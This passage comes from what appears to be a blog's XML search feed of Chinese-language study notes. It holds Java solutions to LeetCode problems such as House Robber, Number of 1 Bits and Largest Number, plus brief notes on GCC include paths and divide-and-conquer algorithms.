        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[203. Remove Linked List Elements]]></title>
      <url>/wiki/2017/10/30/Leetcode-203-Remove-Linked-List-Elements/</url>
      <content type="html"><![CDATA[<p>Remove all elements from a linked list of integers that have value val.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input:  1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val = 6</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove all elements from a linked list of integers that have value val.</span></span><br><span class="line"><span class="comment"> * 一一比对，然后删除匹配元素，需要注意的是删除匹配的头部元素，采取两种方案</span></span><br><span class="line"><span class="comment"> * 1. 直接删除头部元素</span></span><br><span class="line"><span class="comment"> * 2. 加入dummynode，将头部元素按正常元素处理</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 结果是第一种方法快，但是代码量比较多</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-linked-list-elements/description/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q203RemoveLinkedListElements</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理头部元素</span></span><br><span class="line">        <span class="keyword">while</span> (head.val == val) &#123;</span><br><span class="line">            head = head.next;</span><br><span class="line">            <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        <span class="keyword">while</span> (pos.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pos.next.val == val) &#123;</span><br><span class="line">                pos.next = pos.next.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pos =  pos.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对于头部元素的删除，采用另一种更加简便的方法： 加入dummy node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElementsUsingDummy</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        ListNode pos = dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (pos.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pos.next.val == val) &#123;</span><br><span class="line">                pos.next = pos.next.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pos = pos.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[606. Construct String from Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-606-Construct-String-from-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>You need to construct a string consists of parenthesis and integers from a binary tree with the preorder traversing way.</p>
<p>The <code>null</code> node needs to be represented by empty parenthesis pair <code>&quot;()&quot;</code>. And you need to omit all the empty parenthesis pairs that don’t affect the one-to-one mapping relationship between the string and the original binary tree.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Input: Binary tree: [1,2,3,4]</span><br><span class="line">       1</span><br><span class="line">     /   \</span><br><span class="line">    2     3</span><br><span class="line">   /    </span><br><span class="line">  4     </span><br><span class="line"></span><br><span class="line">Output: &quot;1(2(4))(3)&quot;</span><br><span class="line"></span><br><span class="line">Explanation: Originallay it needs to be &quot;1(2(4)())(3()())&quot;, </span><br><span class="line"></span><br><span class="line">but you need to omit all the unnecessary empty parenthesis pairs. </span><br><span class="line">And it will be &quot;1(2(4))(3)&quot;.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: Binary tree: [1,2,3,null,4]</span><br><span class="line">       1</span><br><span class="line">     /   \</span><br><span class="line">    2     3</span><br><span class="line">     \  </span><br><span class="line">      4 </span><br><span class="line"></span><br><span class="line">Output: &quot;1(2()(4))(3)&quot;</span><br><span class="line"></span><br><span class="line">Explanation: Almost the same as the first example, </span><br><span class="line">except we can&apos;t omit the first parenthesis pair </span><br><span class="line">to break the one-to-one mapping relationship between the input and the output.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GCC]]></title>
      <url>/wiki/2017/10/30/TOOLS-GCC/</url>
      <content type="html"><![CDATA[<h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><p>C头文件有两种形式:</p>
<ul>
<li><code>#include &lt;&gt;</code>直接到系统指定的目录中寻找</li>
<li><code>#inlude &quot;&quot;</code>首先在源文件所在文件夹查找，然后再到系统指定的某些目录中去找某些头文件。</li>
</ul>
<p>gcc -I 头文件所在文件夹(绝对路径或相对路径均可) 源文件</p>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gcc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[199. Binary Tree Right Side View]]></title>
      <url>/wiki/2017/10/30/Leetcode-199-Binary-Tree-Right-Side-View/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, imagine yourself standing on the <em>right</em> side of it, return the values of the nodes you can see ordered from top to bottom.</p>
<p><strong>Example</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,null,5,null,4]</span><br><span class="line">Output: [1, 3, 4]</span><br><span class="line">Explanation:</span><br><span class="line"></span><br><span class="line">   1            &lt;---</span><br><span class="line"> /   \</span><br><span class="line">2     3         &lt;---</span><br><span class="line"> \     \</span><br><span class="line">  5     4       &lt;---</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用深度优先遍历，刚好首先遍历到的就是从右边看见的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">rightSideView</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    traversal(list, root, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">traversal</span><span class="params">(List&lt;Integer&gt; list, TreeNode root, <span class="keyword">int</span> height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (height == list.size()) list.add(root.val);</span><br><span class="line">    traversal(list, root.right, height + <span class="number">1</span>);</span><br><span class="line">    traversal(list, root.left, height + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breadth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[198. House Robber]]></title>
      <url>/wiki/2017/10/30/Leetcode-198-House-Robber/</url>
      <content type="html"><![CDATA[<p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p>
<p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).</span><br><span class="line">             Total amount you can rob = 1 + 3 = 4.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,7,9,3,1]</span><br><span class="line">Output: 12</span><br><span class="line">Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1).</span><br><span class="line">             Total amount you can rob = 2 + 9 + 1 = 12.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和<a href="http://larryim.cc/note-algorithm/algorithmStanford/dynamicprogramming/#2-application-maximum-weight-independent-set-of-path-graph">Maximum weight independent set of path graph</a>一摸一样！真是佩服出题人，能改编成这样。</p>
<p>题目中的不能抢相邻的房间，相当于构建一个独立集。要求抢的物品价值最高，相当于构建一个最大独立集。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] totals = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; totals.length; i++)</span><br><span class="line">        totals[i] = Math.max(nums[i - <span class="number">2</span>] + totals[i - <span class="number">2</span>], totals[i - <span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> totals[totals.length - <span class="number">1</span>];   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以舍去中间结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> last = <span class="number">0</span>, secondLast = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        cur = Math.max(nums[i] + secondLast, last);</span><br><span class="line">        secondLast = last;</span><br><span class="line">        last = cur;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> cur;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[191. Number of 1 Bits]]></title>
      <url>/wiki/2017/10/30/Leetcode-191-Number-of-1-Bits/</url>
      <content type="html"><![CDATA[<p>Write a function that takes an unsigned integer and returns the number of ‘1’ bits it has (also known as the <a href="http://en.wikipedia.org/wiki/Hamming_weight">Hamming weight</a>).</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 11</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: Integer 11 has binary representation 00000000000000000000000000001011</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 128</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: Integer 128 has binary representation 00000000000000000000000010000000</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>基本的位操作。将整数右移$i$位，后与1按位与(&amp;)，即可得到整数的二进制表示的第$i$位数字。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        res += (n &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以将1左移，与整数按位与(&amp;)，得到整数的二进制表示的第$i$位数字，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> ((n &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) res++;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，真的需要一一比对这32位数字吗？例如1，有效位数是1，有必要检查所有数字吗？当然不需要。我们可以将$n$右移的时候，同时检测$n$是不是等于0，即是不是还有有效数字。注意右移符号必须是<code>&gt;&gt;&gt;</code>(无符号右移)，而不是<code>&gt;&gt;</code>(有符号右移)。否则当$n$是负数的时候，会产生错误。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">        res += n &amp; <span class="number">1</span>;</span><br><span class="line">        n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么还有没有其他更快的方法呢？比如说8，其二进制表示是<code>1000</code>，第1、2种方法需要32次循环，第3种方法需要4次循环，有没有可能只要1次？答案当然是肯定的。该方法需要用到一个技巧：$n$和比它小1的数($n-1$)的按位与($n \&amp; (n-1)$)把$n$的最低有效位反转为0，而其他表示不变。所以只要连续做按位与（连续把最低有效位变为0），直到最后结果为0，结束循环，循环的次数就是数字的二进制表示中1的数量。</p>
<p>先来看一个例子，演示$n \&amp; (n-1)$：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode191E.png?imageslim" alt="LeetCode191E"></p>
<p>由于$n$的最低1, 永远在$n-1$种对应0。所以按位与操作才能将最低1转化为0.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">        n &amp;= n-<span class="number">1</span>;</span><br><span class="line">        res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[559. Maximum Depth of N-ary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-559-Maximum-Depth-of-N-ary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a n-ary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
<p>For example, given a <code>3-ary</code> tree:</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode559.png" alt="LeetCode559"></p>
<p>We should return its max depth, which is 3.</p>
<p>Note:</p>
<ul>
<li>The depth of the tree is at most 1000.</li>
<li>The total number of nodes is at most 5000.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和104. Maximum Depth of Binary Tree非常类似。只不过二叉树有两个节点，这里有任意个节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node node: root.children) &#123;</span><br><span class="line">        max = Math.max(maxDepth(node), max);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Divide and Conquer]]></title>
      <url>/wiki/2017/10/30/Algorithm-Divide-and-Conquer/</url>
      <content type="html"><![CDATA[<p>In <strong>divide and conquer</strong>(分治法), we solve a problem recursively, applying three steps at each level of the recursion[1]:</p>
<ul>
<li><p><strong>Divide</strong> the problem into a number of subproblems that are smaller instances of the same problem.</p>
</li>
<li><p><strong>Conquer</strong> the subproblems by solving them recursively. If the subproblem sizes are small enough, however, just solve the subproblems in a straightforward manner.</p>
</li>
<li><p><strong>Combine</strong> the solutions to the subproblems into the solution for the original problem.</p>
</li>
</ul>
<p>分治法的设计思想是：</p>
<ul>
<li>分 – 将问题分解为规模更小的子问题；</li>
<li>治 – 递归地解决子问题；</li>
<li>合 – 将子问题的解合并成原问题的解；</li>
</ul>
<h2 id="Recurrences"><a href="#Recurrences" class="headerlink" title="Recurrences"></a>Recurrences</h2><p>Recurrences （递归表达式) go hand in hand with the divide-and-conquer paradigm. A <strong>recurrence</strong> is an equation or inequality that describes a function in terms of its value on smaller inputs[1]. </p>
<p>例如， 归并排序的最差运行时间$T(n)$用递归表达式表达为</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/equation1.png" alt="equation1"></p>
<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><p>利用分治法解决的经典问题：</p>
<ul>
<li>二分搜索</li>
<li>大整数的乘法</li>
<li>Strassen矩阵乘法</li>
<li>归并排序</li>
<li>快速排序</li>
</ul>
<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>MergeSort (归并排序) divides the list $L[0..n-1]$ into two halves $L[0..\llcorner n/2\lrcorner -1]$ and $L[\llcorner n/2\lrcorner ..n-1]$, sorting each of them recursively, and then merging the two smaller sorted arrays into a single sorted one[2].</p>
<p>Pseudocode:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MergeSort Input: List L of ``orderable” elements </span><br><span class="line">Modiﬁes: List L is sorted in-place in ascending order </span><br><span class="line">Output: None</span><br><span class="line"></span><br><span class="line">If n&gt;1</span><br><span class="line">    copy L[0..⎣n/2⎦-1] to A[0..⎣n/2⎦-1]; </span><br><span class="line">    copy L[⎣n/2⎦..n-1] to B[0.. ⎡n/2⎤-1]; </span><br><span class="line">    MergeSort(A[0..⎣n/2⎦-1]); </span><br><span class="line">    MergeSort(B[0..⎡n/2⎤-1]); </span><br><span class="line">    Merge(A,B,L);</span><br></pre></td></tr></table></figure>
<p>Let $C(n)$ be the number of steps MergeSort takes on a list L that has n elements.</p>
<p>Then, we have the recurrence::</p>
<p>$$ C(n) = 2C(n/2)+C_{\text{merge}} (n) \quad \text{for}\quad  n&gt;1, \text{and} \quad  C(1)=1$$</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] 算法导论(第三版英文版)<br>[2] Algorithm thinking on Coursera</p>
]]></content>
      
        <categories>
            
            <category> Algorithm </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[179. Largest Number]]></title>
      <url>/wiki/2017/10/30/Leetcode-179-Largest-Number/</url>
      <content type="html"><![CDATA[<p>Given a list of non negative integers, arrange them such that they form the largest number.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [10,2]</span><br><span class="line">Output: &quot;210&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,30,34,5,9]</span><br><span class="line">Output: &quot;9534330&quot;</span><br></pre></td></tr></table></figure>
<p>Note: The result may be very large, so you need to return a string instead of an integer.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最大数问题。首先，最笨的方法，也是最直接的办法，把所有数字转化为字符串，然后依次比较字符串，最后把字符串连接起来的到结果。怎么比较字符串呢？也是最笨的方法，比较字符串放在前面和后面形成的两种字符串。还需要注意全是0的情况。当然效率是非常低的。不过也是种解决方案。</p>
<p>利用函数式编程写的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// to string array</span></span><br><span class="line">    String[] a = Arrays.stream(nums).</span><br><span class="line">        mapToObj(Integer::toString).</span><br><span class="line">        toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">    <span class="comment">// sort and concat</span></span><br><span class="line">    String res = Arrays.stream(a).</span><br><span class="line">        sorted(((o1, o2) -&gt;o2.concat(o1).compareTo(o1.concat(o2)))).</span><br><span class="line">        collect(Collectors.joining());</span><br><span class="line">    <span class="comment">// special occasion: all zero</span></span><br><span class="line">    <span class="keyword">if</span> (res.charAt(<span class="number">0</span>) == <span class="string">'0'</span> &amp;&amp; res.length() &gt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现好慢啊阿啊，只击败了12%的人，吐血！这说明，虽然函数式编程很优美，但是在LeetCode上面还是算了。</p>
<p>常规写法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)</span><br><span class="line">        